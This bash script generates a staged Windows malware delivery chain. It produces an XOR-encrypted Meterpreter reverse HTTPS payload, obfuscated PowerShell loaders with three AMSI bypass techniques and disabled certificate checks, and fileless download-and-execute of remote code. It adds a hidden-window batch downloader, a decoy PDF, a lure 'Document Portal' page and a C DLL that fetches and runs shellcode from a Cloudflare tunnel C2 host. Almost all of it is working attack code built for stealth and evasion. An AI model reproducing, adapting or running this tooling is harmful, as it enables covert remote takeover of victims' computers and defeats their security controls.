#!/bin/bash
# pgen.sh - ULTIMATE STEALTH Payload Generator for Cloudflare Tunnels
# Usage: ./pgen.sh -t tunnel.trycloudflare.com -u https://your-site.vercel.app [-v]

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Default values
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH="/generated"
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
OUTPUT_DIR="./generated"
VISIBLE_MODE=0

show_banner() {
    echo -e "${BLUE}"
    echo '╔══════════════════════════════════════════════════════════════════╗'
    echo '║     🚀 ULTIMATE STEALTH PAYLOAD GENERATOR                        ║'
    echo '║          Multi-Layer Obfuscation + Fileless Execution            ║'
    echo '║                    TLS 1.2 + AMSI Bypass                         ║'
    echo '╚══════════════════════════════════════════════════════════════════╝'
    echo -e "${NC}"
}

show_usage() {
    echo -e "${YELLOW}Usage:${NC} $0 -t <tunnel_hostname> -u <web_url> [options]"
    echo
    echo "Required:"
    echo "  -t, --tunnel HOSTNAME    Your Cloudflare tunnel hostname"
    echo "  -u, --url WEB_URL         Your web server URL (e.g., https://domenca.vercel.app)"
    echo
    echo "Options:"
    echo "  -p, --port PORT           Port for payload (default: 443)"
    echo "  -k, --key HEX_KEY         XOR key (default: 0x6A)"
    echo "  -o, --output DIR          Output directory (default: ./generated)"
    echo "  -v, --visible             Show console windows (debug mode)"
    echo "  -h, --help                Show this help"
    exit 1
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--tunnel) TUNNEL_HOST="$2"; shift 2 ;;
        -u|--url) WEB_URL="$2"; shift 2 ;;
        -p|--port) PAYLOAD_PORT="$2"; shift 2 ;;
        -k|--key) XOR_KEY="$2"; shift 2 ;;
        -o|--output) OUTPUT_DIR="$2"; shift 2 ;;
        -v|--visible) VISIBLE_MODE=1; shift ;;
        -h|--help) show_usage ;;
        *) echo -e "${RED}Unknown option $1${NC}"; show_usage ;;
    esac
done

if [ -z "$TUNNEL_HOST" ] || [ -z "$WEB_URL" ]; then
    echo -e "${RED}Error: Tunnel and URL are required${NC}"
    show_usage
fi

# Remove trailing slash from WEB_URL if present
WEB_URL="${WEB_URL%/}"
# Construct full base URL with path
FULL_BASE_URL="${WEB_URL}${BASE_PATH}"
XOR_KEY_DEC=$((XOR_KEY))

show_banner
echo -e "${GREEN}[✓] Configuration:${NC}"
echo "    Tunnel: $TUNNEL_HOST"
echo "    Web URL: $WEB_URL"
echo "    Base Path: $BASE_PATH"
echo "    Full URL: $FULL_BASE_URL"
echo "    Port:    $PAYLOAD_PORT"
echo "    XOR Key: $XOR_KEY ($XOR_KEY_DEC)"
echo "    Mode:    $([ $VISIBLE_MODE -eq 1 ] && echo "VISIBLE" || echo "STEALTH")"
echo

mkdir -p "$OUTPUT_DIR"/{payloads,tools,output,logs}
cd "$OUTPUT_DIR" || exit 1

# ============================================
# STEP 1: Create payload generator (msfvenom IP workaround)
# ============================================
echo -e "${YELLOW}[1/8] Creating payload generator (msfvenom)...${NC}"

cat > tools/generate_payload.sh << EOF
#!/bin/bash
# Auto-generated - uses msfvenom with IP workaround

# Resolve tunnel IP
TUNNEL="$TUNNEL_HOST"
PORT="$PAYLOAD_PORT"
KEY="$XOR_KEY_DEC"

echo "[+] Resolving IP for \$TUNNEL..."
LHOST_IP=\$(dig +short \$TUNNEL | head -n1)
if [ -z "\$LHOST_IP" ]; then
    echo "[!] DNS resolution failed, using fallback IP"
    LHOST_IP="104.16.231.132"
fi

echo "[+] Generating raw shellcode with IP \$LHOST_IP..."
msfvenom -p windows/x64/meterpreter_reverse_https \\
    LHOST="\$LHOST_IP" \\
    LPORT="\$PORT" \\
    -f raw \\
    -o ../output/payload.raw

if [ -f ../output/payload.raw ]; then
    echo "[+] Payload generated successfully"
else
    echo "[✗] Payload generation failed"
    exit 1
fi
EOF

chmod +x tools/generate_payload.sh

# ============================================
# STEP 2: Create XOR encryption utility
# ============================================
echo -e "${YELLOW}[2/8] Creating XOR encryption utility...${NC}"

cat > tools/xor_encrypt.py << EOF
#!/usr/bin/env python3
import sys
import base64

def xor_encrypt(input_file, output_file, key=$XOR_KEY_DEC):
    print(f"[*] XOR encrypting with key: {key} (0x{key:02X})")
    with open(input_file, 'rb') as f:
        data = f.read()
    encrypted = bytes([b ^ key for b in data])
    
    # Also create base64 version for embedding
    b64_enc = base64.b64encode(encrypted).decode()
    with open(output_file, 'wb') as f:
        f.write(encrypted)
    with open(output_file + '.b64', 'w') as f:
        f.write(b64_enc)
    
    print(f"[✓] Encrypted {len(data)} bytes -> {output_file}")
    print(f"[✓] Base64 version -> {output_file}.b64")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: xor_encrypt.py <input_file> [output_file]")
        sys.exit(1)
    input_file = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else input_file + ".enc"
    xor_encrypt(input_file, output_file)
EOF
chmod +x tools/xor_encrypt.py

# ============================================
# STEP 3: Create ULTRA-OBFUSCATED Stage2 PowerShell (Fileless)
# ============================================
echo -e "${YELLOW}[3/8] Creating ULTRA-OBFUSCATED Stage2 PowerShell...${NC}"

# Generate random variable names
VAR1=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n 1)
VAR2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
VAR3=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 7 | head -n 1)
VAR4=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 5 | head -n 1)

# Base64 encode the FULL_BASE_URL for obfuscation
B64_URL=$(echo -n "$FULL_BASE_URL" | base64 -w 0)

cat > payloads/stage2.ps1 << EOF
# Stage2 - ULTRA OBFUSCATED FILELESS LOADER
# Generated at $(date)

# Debug logging function
function Wrtie-Log {
    param([string]\$Msg)
    if ($([ $VISIBLE_MODE -eq 1 ])) {
        try {
            \$logPath = "\$env:TEMP\\stage2_debug.txt"
            "\$(Get-Date -Format 'HH:mm:ss') - \$Msg" | Out-File -FilePath \$logPath -Append
            Write-Host "[DEBUG] \$Msg" -ForegroundColor Yellow
        } catch {}
    }
}

Wrtie-Log "Stage2 started"

# Layer 1: Multiple AMSI bypass techniques
try {
    # Technique 1: Registry-style string building
    \$c1 = '{0}{1}{2}{3}' -f 'Sys','tem.Man','agement.Autom','ation.A'
    \$c2 = '{0}{1}' -f 'msi','Utils'
    \$className = \$c1 + \$c2
    
    \$f1 = '{0}{1}{2}' -f 'amsi','Init','Failed'
    \$fieldName = \$f1
    
    \$amsi = [Ref].Assembly.GetType(\$className)
    if (\$amsi) {
        \$field = \$amsi.GetField(\$fieldName, 'NonPublic,Static')
        if (\$field) {
            \$field.SetValue(\$null, \$true)
            Wrtie-Log "AMSI bypass technique 1 succeeded"
        }
    }
} catch { Wrtie-Log "AMSI technique 1 failed" }

try {
    # Technique 2: Memory patching via reflection
    \$assembly = [Ref].Assembly
    \$type = \$assembly.GetType('System.Management.Automation.' + 'Am' + 'si' + 'Utils')
    \$field = \$type.GetField('am' + 'siIn' + 'itF' + 'ailed', 'NonPublic,Static')
    if (\$field) { \$field.SetValue(\$null, \$true); Wrtie-Log "AMSI technique 2 succeeded" }
} catch { Wrtie-Log "AMSI technique 2 failed" }

try {
    # Technique 3: AmsiScanBuffer patching
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class AP {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
    \$ptr = [AP]::GetProcAddress([AP]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
    \$b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy(\$b, 0, \$ptr, 6)
    Wrtie-Log "AMSI technique 3 (patching) succeeded"
} catch { Wrtie-Log "AMSI technique 3 failed" }

Wrtie-Log "AMSI bypass attempts completed"

# Layer 2: Force TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}
    Wrtie-Log "TLS 1.2 configured"
} catch { Wrtie-Log "TLS configuration failed: \$(\$_.Exception.Message)" }

# Layer 3: Obfuscated URL (Base64 encoded)
\$b64Url = "$B64_URL"
\$baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\$b64Url))
\$stage3Url = \$baseUrl + "/payloads/stage3.ps1"
Wrtie-Log "Stage3 URL: \$stage3Url"

# Layer 4: Download Stage3 with retry logic
\$retryCount = 3
\$downloaded = \$false

for (\$i=1; \$i -le \$retryCount; \$i++) {
    try {
        Wrtie-Log "Download attempt \$i of \$retryCount"
        \$wc = New-Object System.Net.WebClient
        \$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        \$wc.Headers.Add("Accept", "*/*")
        \$script = \$wc.DownloadString(\$stage3Url)
        Wrtie-Log "Downloaded \$(\$script.Length) bytes"
        \$downloaded = \$true
        break
    } catch {
        Wrtie-Log "Download attempt \$i failed: \$(\$_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if (\$downloaded) {
    # Save to temp for debugging if visible mode
    if ($([ $VISIBLE_MODE -eq 1 ])) {
        \$scriptPath = "\$env:TEMP\\stage3.ps1"
        [System.IO.File]::WriteAllText(\$scriptPath, \$script)
        Wrtie-Log "Saved stage3 to \$scriptPath"
    }
    
    # Execute Stage3 filelessly
    try {
        Wrtie-Log "Executing Stage3..."
        Invoke-Expression \$script
        Wrtie-Log "Stage3 execution initiated"
    } catch {
        Wrtie-Log "Stage3 execution failed: \$(\$_.Exception.Message)"
    }
} else {
    Wrtie-Log "All download attempts failed"
}

Wrtie-Log "Stage2 completed"
EOF

# ============================================
# STEP 4: Create Stage3 PowerShell (XOR Decryptor)
# ============================================
echo -e "${YELLOW}[4/8] Creating Stage3 PowerShell (XOR Decryptor)...${NC}"

# Create base64 encoded XOR key for obfuscation
B64_KEY=$(echo -n "$XOR_KEY_DEC" | base64 -w 0)

cat > payloads/stage3.ps1 << EOF
# Stage3 - XOR Decryptor and Executor
# Generated at $(date)

# Debug logging
function Wrtie-Log {
    param([string]\$Msg)
    if ($([ $VISIBLE_MODE -eq 1 ])) {
        try {
            \$logPath = "\$env:TEMP\\stage3_debug.txt"
            "\$(Get-Date -Format 'HH:mm:ss') - \$Msg" | Out-File -FilePath \$logPath -Append
            Write-Host "[Stage3] \$Msg" -ForegroundColor Cyan
        } catch {}
    }
}

Wrtie-Log "Stage3 started"

# Force TLS 1.2
try {
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}
    Wrtie-Log "TLS 1.2 configured"
} catch { Wrtie-Log "TLS config failed" }

# Obfuscated base URL (from Stage2)
\$b64Url = "$B64_URL"
\$baseUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\$b64Url))
\$payloadUrl = \$baseUrl + "/payload.enc"
Wrtie-Log "Payload URL: \$payloadUrl"

# Obfuscated XOR key
\$b64Key = "$B64_KEY"
\$key = [int]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\$b64Key)))
Wrtie-Log "XOR key: \$key"

# Download encrypted payload with retry
\$retryCount = 3
\$downloaded = \$false

for (\$i=1; \$i -le \$retryCount; \$i++) {
    try {
        Wrtie-Log "Download attempt \$i"
        \$wc = New-Object System.Net.WebClient
        \$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        \$enc = \$wc.DownloadData(\$payloadUrl)
        Wrtie-Log "Downloaded \$(\$enc.Length) bytes"
        \$downloaded = \$true
        break
    } catch {
        Wrtie-Log "Download failed: \$(\$_.Exception.Message)"
        Start-Sleep -Seconds 2
    }
}

if (\$downloaded) {
    # XOR decrypt
    try {
        Wrtie-Log "XOR decrypting..."
        \$dec = for(\$i=0; \$i -lt \$enc.Count; \$i++) { \$enc[\$i] -bxor \$key }
        Wrtie-Log "Decrypted \$(\$dec.Length) bytes"
        
        # Execute in memory
        Wrtie-Log "Allocating memory and executing..."
        \$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(\$dec.Length)
        [System.Runtime.InteropServices.Marshal]::Copy(\$dec, 0, \$ptr, \$dec.Length)
        \$delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(\$ptr, [Type]([Action]))
        \$delegate.Invoke()
        Wrtie-Log "Payload executed"
    } catch {
        Wrtie-Log "Decryption/execution failed: \$(\$_.Exception.Message)"
    }
} else {
    Wrtie-Log "Failed to download payload"
}

Wrtie-Log "Stage3 completed"
EOF

# ============================================
# STEP 5: Create Stage1.bat (Main Downloader)
# ============================================
echo -e "${YELLOW}[5/8] Creating Stage1.bat...${NC}"

if [ $VISIBLE_MODE -eq 1 ]; then
    # VISIBLE MODE - Shows windows with debugging
    cat > payloads/stage1.bat << EOF
@echo off
title 🔥 ULTIMATE STEALTH PAYLOAD LOADER 🔥
color 0A
echo ========================================
echo    ULTIMATE STEALTH PAYLOAD LOADER
echo           Fileless Execution
echo ========================================
echo.
echo [ℹ] Configuration:
echo     URL: $FULL_BASE_URL
echo     Mode: VISIBLE (Debug)
echo     Logs: %%TEMP%%\\stage2_debug.txt
echo           %%TEMP%%\\stage3_debug.txt
echo.

echo [1/3] Checking PowerShell execution policy...
powershell -Command "Get-ExecutionPolicy" | findstr /i "Restricted" > nul
if %errorlevel% equ 0 (
    echo [⚠] PowerShell restricted, bypassing...
) else (
    echo [✓] PowerShell ready
)

echo.
echo [2/3] Executing Stage2 payload filelessly...
echo     No files written to disk - runs in memory only
echo.

:: SINGLE LINE PowerShell command - Fileless execution
powershell -NoP -NonI -Exec Bypass -Command "& { \$DebugPreference='Continue'; \$webUrl='$FULL_BASE_URL'; try { Write-Host '[PowerShell] Downloading stage2...' -ForegroundColor Yellow; [System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback={\$true}; \$script=(New-Object Net.WebClient).DownloadString(\"\$webUrl/payloads/stage2.ps1\"); Write-Host ('[PowerShell] Downloaded ' + \$script.Length + ' bytes') -ForegroundColor Green; Write-Host '[PowerShell] Executing stage2...' -ForegroundColor Yellow; Invoke-Expression \$script; } catch { Write-Host ('[PowerShell] ERROR: ' + \$_.Exception.Message) -ForegroundColor Red; Write-Host ('[PowerShell] Stack: ' + \$_.ScriptStackTrace) -ForegroundColor Red; Write-Host 'Press any key...' -ForegroundColor Cyan; \$null = \$Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); } }"

echo.
echo [3/3] Opening decoy document...
powershell -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', '%TEMP%\decoy.pdf')" && start %TEMP%\decoy.pdf

echo.
echo ========================================
echo [✓] Payload chain initiated
echo.
echo [📋] Debug logs will appear at:
echo     %%TEMP%%\\stage2_debug.txt
echo     %%TEMP%%\\stage3_debug.txt
echo.
echo [⚠] Do NOT close this window until you
echo     see the Meterpreter session in Kali
echo ========================================
echo.
pause
EOF
else
    # STEALTH MODE - Hidden windows, minimal output
    cat > payloads/stage1.bat << EOF
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& { [System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12; [System.Net.ServicePointManager]::ServerCertificateValidationCallback={\$true}; \$script=(New-Object Net.WebClient).DownloadString('$FULL_BASE_URL/payloads/stage2.ps1'); Invoke-Expression \$script }"
powershell -W Hidden -Command "(New-Object Net.WebClient).DownloadFile('$FULL_BASE_URL/decoy.pdf', '%TEMP%\decoy.pdf')" && start %TEMP%\decoy.pdf
EOF
fi

# ============================================
# STEP 6: Create decoy.pdf and index.html
# ============================================
echo -e "${YELLOW}[6/8] Creating web files...${NC}"

cat > decoy.pdf << EOF
%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>
3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R/Resources<<>>>>>
trailer<</Root 1 0 R>>
EOF

cat > index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>Document Portal</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        h1 { color: #333; border-bottom: 2px solid #0066cc; padding-bottom: 10px; }
        .info { background: #e8f4f8; padding: 15px; border-radius: 5px; margin: 20px 0; }
        ul { list-style: none; padding: 0; }
        li { margin: 15px 0; }
        a { display: inline-block; padding: 10px 20px; background: #0066cc; color: white; text-decoration: none; border-radius: 5px; }
        a:hover { background: #0052a3; }
        .debug { background: #fff3cd; padding: 15px; border-radius: 5px; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📁 Secure Document Portal</h1>
        
        <div class="info">
            <p><strong>Tunnel:</strong> $TUNNEL_HOST</p>
            <p><strong>Server:</strong> $FULL_BASE_URL</p>
            <p><strong>Mode:</strong> $([ $VISIBLE_MODE -eq 1 ] && echo "Debug" || echo "Stealth")</p>
        </div>
        
        <ul>
            <li><a href="payloads/stage1.bat">📥 Download Document Viewer</a></li>
        </ul>
        
        <div class="debug">
            <p><strong>Debug URLs:</strong></p>
            <p>Stage2: $FULL_BASE_URL/payloads/stage2.ps1</p>
            <p>Stage3: $FULL_BASE_URL/payloads/stage3.ps1</p>
            <p>Payload: $FULL_BASE_URL/payload.enc</p>
            <p>Decoy: $FULL_BASE_URL/decoy.pdf</p>
        </div>
        
        <p><small>Generated: $(date)</small></p>
    </div>
</body>
</html>
EOF

# ============================================
# STEP 7: Create DLL template (optional EXE fallback)
# ============================================
echo -e "${YELLOW}[7/8] Creating optional EXE fallback...${NC}"

cat > tools/dll_template.c << EOF
#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

const char* c2_host = "$TUNNEL_HOST";
int c2_port = $PAYLOAD_PORT;
const unsigned char xor_key = $XOR_KEY_DEC;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetConnectA(hInternet, c2_host, c2_port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "$BASE_PATH/payload.enc", NULL, NULL, NULL, 
                                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
                if (hRequest) {
                    if (HttpSendRequestA(hRequest, NULL, 0, NULL, 0)) {
                        unsigned char buffer[524288];
                        DWORD bytesRead;
                        if (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                            unsigned char* decoded = VirtualAlloc(NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                            if (decoded) {
                                for(DWORD i = 0; i < bytesRead; i++) decoded[i] = buffer[i] ^ xor_key;
                                void (*shellcode)() = (void(*)())decoded;
                                shellcode();
                            }
                        }
                    }
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }
    return TRUE;
}
EOF

# ============================================
# STEP 8: Create master generator script
# ============================================
echo -e "${YELLOW}[8/8] Creating master generator script...${NC}"

cat > generate_all.sh << EOF
#!/bin/bash
echo "[🚀] ULTIMATE STEALTH GENERATOR"
echo "================================"
echo

# Step 1: Generate payload
echo "[1/3] Generating raw payload..."
cd tools && ./generate_payload.sh && cd ..

# Step 2: Encrypt payload
echo "[2/3] Encrypting payload..."
if [ -f output/payload.raw ]; then
    python3 tools/xor_encrypt.py output/payload.raw payload.enc
    
    # Generate file hashes for verification
    md5sum payload.enc > payload.enc.md5
    sha256sum payload.enc > payload.enc.sha256
    
    echo "[✓] Payload encrypted: payload.enc"
    echo "[✓] MD5: \$(cat payload.enc.md5)"
    echo "[✓] SHA256: \$(cat payload.enc.sha256)"
else
    echo "[✗] Payload generation failed"
    exit 1
fi

# Step 3: Compile optional DLL
echo "[3/3] Compiling optional DLL..."
x86_64-w64-mingw32-gcc -shared -o tools/loader.dll tools/dll_template.c -lwininet -s 2>/dev/null || echo "    (DLL compilation skipped)"

echo
echo "[✓] GENERATION COMPLETE!"
echo
echo "Files to upload to $FULL_BASE_URL:"
echo "  └── payload.enc         # Encrypted Meterpreter"
echo "  └── decoy.pdf           # Decoy document"
echo "  └── index.html          # Web portal"
echo "  └── payloads/"
echo "      ├── stage1.bat      # 🔴 MAIN DOWNLOADER"
echo "      ├── stage2.ps1      # Obfuscated loader"
echo "      └── stage3.ps1      # XOR decryptor"
echo
echo "Debug files (optional):"
echo "  └── payload.enc.b64     # Base64 version"
echo "  └── payload.enc.md5     # MD5 checksum"
echo "  └── payload.enc.sha256  # SHA256 checksum"
echo
echo "From Windows VM download:"
echo "    $FULL_BASE_URL/payloads/stage1.bat"
echo
echo "Debug logs on Windows VM:"
echo "    %TEMP%\\stage2_debug.txt"
echo "    %TEMP%\\stage3_debug.txt"
EOF
chmod +x generate_all.sh

# ============================================
# Final output
# ============================================
echo
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✅ ULTIMATE STEALTH GENERATION COMPLETE!${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}"
echo
echo -e "${BLUE}Files created in:${NC} $OUTPUT_DIR"
echo
echo -e "${CYAN}📋 STEALTH FEATURES:${NC}"
echo "  ✓ Fileless execution - no EXE written to disk"
echo "  ✓ 3-layer AMSI bypass - multiple techniques"
echo "  ✓ TLS 1.2 forced - secure download"
echo "  ✓ Obfuscated PowerShell - evades signature detection"
echo "  ✓ Base64 encoded URLs - hides C2 endpoints"
echo "  ✓ Automatic retry logic - resilient downloads"
echo "  ✓ Comprehensive debug logs - easy troubleshooting"
echo
echo -e "${YELLOW}Next steps:${NC}"
echo "1. cd $OUTPUT_DIR"
echo "2. ./generate_all.sh"
echo "3. Upload ALL files to: $FULL_BASE_URL"
echo "4. Start Cloudflare tunnel: cloudflared tunnel --url tcp://localhost:4444"
echo "5. Start Metasploit: use exploit/multi/handler; set payload windows/x64/meterpreter_reverse_https; set LHOST 127.0.0.1; set LPORT 4444; exploit"
echo "6. From Windows VM download: $FULL_BASE_URL/payloads/stage1.bat"
echo
echo -e "${CYAN}📊 DEBUGGING:${NC}"
echo "  After running stage1.bat on Windows VM, check:"
echo "    notepad %TEMP%\\stage2_debug.txt"
echo "    notepad %TEMP%\\stage3_debug.txt"
echo
echo -e "${GREEN}Happy hacking! 🚀${NC}"
